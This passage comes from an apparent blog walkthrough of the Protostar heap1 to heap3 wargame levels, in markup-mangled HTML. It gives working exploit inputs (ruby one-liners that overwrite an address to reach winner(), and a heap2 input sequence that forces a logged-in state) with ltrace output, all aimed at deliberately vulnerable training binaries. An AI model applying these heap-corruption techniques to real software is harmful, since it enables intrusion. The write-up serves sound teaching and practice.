-</span><span class='line'>08048494 T winner</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Goal is to write the value <code>0x08048494</code> to the <code>0x08049774</code> address.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>strcpy(i1->name, argv[1]):
-</span><span class='line'>(8) 0x0804a000: i1-control
-</span><span class='line'>(4) 0x0804a008: i1-priority
-</span><span class='line'>(4) 0x0804a00c: i1-name(addr)&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a010: i1-name-control
-</span><span class='line'>(8) 0x0804a018: i1-name             # AAAAAAAA&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a020: i2-control          # AAAAAAAA
-</span><span class='line'>(4) 0x0804a028: i2-priority         # AAAA
-</span><span class='line'>(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack(&ldquo;V&rdquo;)&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a030: i2-name-control   &lt;br/>
-</span><span class='line'>(8) 0x0804a038: i2-name&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>strcpy(i2->name, argv[2]):
-</span><span class='line'>(8) 0x0804a000: i1-control
-</span><span class='line'>(4) 0x0804a008: i1-priority
-</span><span class='line'>(4) 0x0804a00c: i1-name(addr)&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a010: i1-name-control
-</span><span class='line'>(8) 0x0804a018: i1-name             # AAAAAAAA&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a020: i2-control          # AAAAAAAA
-</span><span class='line'>(4) 0x0804a028: i2-priority         # AAAA
-</span><span class='line'>(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack(&ldquo;V&rdquo;)&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a030: i2-name-control
-</span><span class='line'>(8) 0x0804a038: i2-name             # [0x08048494].pack(&ldquo;V&rdquo;)</span></code></pre></td></tr></table></div></figure></p>
-
-<p>The second <code>strcpy()</code> takes <code>i2-name(addr) = 0x08049774</code> and copies over there the <code>argv[2]</code> value.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x08049774].pack(&ldquo;V&rdquo;)&rsquo;) $(ruby -e &lsquo;print [0x08048494].pack(&ldquo;V&rdquo;)&rsquo;)
-</span><span class='line'>__libc_start_main(0x80484b9, 3, 0xbffff824, 0x8048580, 0x8048570 &lt;unfinished ...>
-</span><span class='line'>malloc(8)                                                   = 0x0804a008
-</span><span class='line'>malloc(8)                                                   = 0x0804a018
-</span><span class='line'>malloc(8)                                                   = 0x0804a028
-</span><span class='line'>malloc(8)                                                   = 0x0804a038
-</span><span class='line'>strcpy(0x0804a018, &ldquo;AAAAAAAAAAAAAAAAAAAAt\227\004\b&rdquo;)       = 0x0804a018
-</span><span class='line'>strcpy(0x08049774, &ldquo;\224\204\004\b&rdquo;)                        = 0x08049774
-</span><span class='line'>puts(&ldquo;and that&rsquo;s a wrap folks!&rdquo; &lt;unfinished ...>
-</span><span class='line'>time(NULL)                                                  = 1435153654
-</span><span class='line'>printf(&ldquo;and we have a winner @ %d\n&rdquo;, 1435153654and we have a winner @ 1435153654
-</span><span class='line'>)                                                                             = 34
-</span><span class='line'>&lt;&hellip; puts resumed> )                                                                                                          = 34
-</span><span class='line'>+++ exited (status 34) +++</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x08049774].pack(&ldquo;V&rdquo;)&rsquo;) $(ruby -e &lsquo;print [0x08048494].pack(&ldquo;V&rdquo;)&rsquo;)
-</span><span class='line'>and we have a winner @ 1435149585</span></code></pre></td></tr></table></div></figure></p>
-
-<h2>Protostar Heap2</h2>
-
-<p><figure class='code'><figcaption><span>heap2.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">auth</span> <span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">auth</span><span class="p">;</span>
-</span><span class='line'><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">auth</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">auth</span><span class="p">;</span>
-</span><span class='line'><span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">service</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span> <span class="n">auth</span> <span class="o">=</span> <span class="o">%</span><span class="n">p</span><span class="p">,</span> <span class="n">service</span> <span class="o">=</span> <span class="o">%</span><span class="n">p</span> <span class="p">]</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">auth</span><span class="p">,</span> <span class="n">service</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;auth &quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">auth</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
-</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
-</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">31</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>          <span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">name</span><span class="p">,</span> <span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
-</span><span class='line'>      <span class="p">}</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;reset&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;service&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">service</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">auth</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">auth</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have logged in already!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;please enter your password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>      <span class="p">}</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Running the binary:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap2
-</span><span class='line'>[ auth = (nil), service = (nil) ]
-</span><span class='line'>auth 1234
-</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
-</span><span class='line'>service 5678
-</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
-</span><span class='line'>login
-</span><span class='line'>please enter your password
-</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure></p>
-
-<p>This is strange, the <code>service</code> variable is allocated at <code>0x0804c018</code>, but
-obviously we cannot have the following heap chucks:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804c000: auth-control
-</span><span class='line'>(32) 0x0804c008: auth-name
-</span><span class='line'>(04) 0x0804c028: auth-auth&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(08) 0x0804c010: service-control
-</span><span class='line'>(xx) 0x0804c018: service</span></code></pre></td></tr></table></div></figure></p>
-
-<p>There should be <code>sizeof(struct auth) = 32+4</code> instead of <code>sizeof(auth) = 4</code> and in
-our buggy code we allocated only four bytes of memory:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>auth = malloc(sizeof(auth));
-</span><span class='line'>memset(auth, 0, sizeof(auth));</span></code></pre></td></tr></table></div></figure></p>
-
-<p>This is very simple <code>Use-After-Free</code> vulnerability. We need to write something
-to <code>auth-auth</code>, after <code>0x0804c028-0x0804c018 = 16</code> bytes.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap2
-</span><span class='line'>__libc_start_main(0x8048934, 1, 0xbffff864, 0x804acc0, 0x804acb0 &lt;unfinished ...>
-</span><span class='line'>printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, (nil), (nil)[ auth = (nil), service = (nil) ]
-</span><span class='line'>)                                                                         = 34
-</span><span class='line'>fgets(auth A
-</span><span class='line'>&ldquo;auth A\n&rdquo;, 128, 0xb7fd8420)                                                                                            = 0xbffff730
-</span><span class='line'>strncmp(&ldquo;auth A\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                                               = 0
-</span><span class='line'>sysconf(30, 0, 0xb7fe1b28, 1, 0)                                                                                              = 4096
-</span><span class='line'>sbrk(4096)                                                                                                                    = 0x0804c000
-</span><span class='line'>sbrk(0)                                                                                                                       = 0x0804d000
-</span><span class='line'>memset(0x0804c008, &lsquo;\000&rsquo;, 4)                                                                                                 = 0x0804c008
-</span><span class='line'>strlen(&ldquo;A\n&rdquo;)                                                                                                                 = 2
-</span><span class='line'>strcpy(0x0804c008, &ldquo;A\n&rdquo;)                                                                                                     = 0x0804c008
-</span><span class='line'>strncmp(&ldquo;auth A\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                                               = -17
-</span><span class='line'>strncmp(&ldquo;auth A\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                                             = -18
-</span><span class='line'>strncmp(&ldquo;auth A\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                                               = -11
-</span><span class='line'>printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, 0x804c008, (nil)[ auth = 0x804c008, service = (nil) ]
-</span><span class='line'>)                                                                     = 38
-</span><span class='line'>fgets(service AAAAAAAAAAAAAAA
-</span><span class='line'>&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, 128, 0xb7fd8420)                                                                           = 0xbffff730
-</span><span class='line'>strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                              = 18
-</span><span class='line'>strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                              = 1
-</span><span class='line'>strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                            = 0
-</span><span class='line'>strdup(&ldquo; AAAAAAAAAAAAAAA\n&rdquo;)                                                                                                  = 0x0804c018
-</span><span class='line'>strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                              = 7
-</span><span class='line'>printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
-</span><span class='line'>)                                                                 = 42
-</span><span class='line'>fgets(login
-</span><span class='line'>&ldquo;login\n&rdquo;, 128, 0xb7fd8420)                                                                                             = 0xbffff730
-</span><span class='line'>strncmp(&ldquo;login\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                                                = 11
-</span><span class='line'>strncmp(&ldquo;login\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                                                = -6
-</span><span class='line'>strncmp(&ldquo;login\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                                              = -7
-</span><span class='line'>strncmp(&ldquo;login\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                                                = 0
-</span><span class='line'>puts(&ldquo;you have logged in already!"you have logged in already!
-</span><span class='line'>)                                                                                           = 28
-</span><span class='line'>printf(&rdquo;[ auth = %p, service = %p ]\n", 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
-</span><span class='line'>)                                                                 = 42
-</span><span class='line'>fgets(&ldquo;login\n&rdquo;, 128, 0xb7fd8420)                                                                                             = NULL
-</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure></p>
-
-<p>As we can see above, we sent 15 character + newline.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap2
-</span><span class='line'>[ auth = (nil), service = (nil) ]
-</span><span class='line'>auth A
-</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
-</span><span class='line'>service AAAAAAAAAAAAAAA
-</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
-</span><span class='line'>login
-</span><span class='line'>you have logged in already!
-</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;puts &ldquo;auth A&rdquo;; puts &ldquo;service &rdquo; + &ldquo;A&rdquo; * 15; puts &ldquo;login&rdquo;&rsquo; | /opt/protostar/bin/heap2
-</span><span class='line'>[ auth = (nil), service = (nil) ]
-</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
-</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
-</span><span class='line'>you have logged in already!
-</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure></p>
-
-<h2>Protostar Heap3</h2>
-
-<p>This level introduces old <code>Doug Lea Malloc</code> version, which is statically linked with <code>heap3</code> binary.</p>
-
-<p><figure class='code'><figcaption><span>heap3.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">winner</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">that</span> <span class="n">wasn</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">a</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
